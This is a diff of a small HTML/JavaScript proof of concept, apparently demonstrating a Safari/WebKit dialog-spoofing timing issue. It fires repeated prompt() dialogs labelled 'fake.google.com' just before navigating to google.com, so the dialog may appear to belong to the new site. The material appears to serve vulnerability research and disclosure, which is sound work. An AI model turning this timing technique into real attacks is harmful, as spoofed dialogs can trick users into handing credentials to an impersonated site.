@@ -1,38 +1,22 @@
-<!DOCTYPE html>
-<html>
-<head>
-<meta charset="utf-8">
-<title>Safari Dialog Timing PoC</title>
-</head>
-
-<body style="background:#000;color:#fff;font-family:sans-serif;text-align:center;">
-<h3>Loading…</h3>
-
 <script>
-// Prepare lifecycle state (relevant for Safari/WebKit)
 history.pushState({}, "", "#poc");
 window.addEventListener("pagehide", () => {});
 window.addEventListener("beforeunload", () => {});
 
-// Let page settle shortly
 setTimeout(() => {
-
-  // Trigger top-level navigation
-  location.href = "https://www.google.com";
-
-  // Burst attempts inside navigation timing window
-  [5, 15, 30].forEach(delay => {
+  // Burst prompts BEFORE top-level navigation
+  [0, 30, 60].forEach(delay => {
     setTimeout(() => {
       try {
-        prompt(
-          "fake.google.com\n⚠️ Do not sign into your account",
-          ""
-        );
-      } catch (e) {}
+        prompt("fake.google.com\n⚠️ Do not sign into your account", "");
+      } catch(e){}
     }, delay);
   });
 
+  // Trigger top-level navigation AFTER prompt attempts
+  setTimeout(() => {
+    location.href = "https://www.google.com";
+  }, 90); // navigation slightly delayed
 }, 120);
 </script>
-</body>
-</html>
+
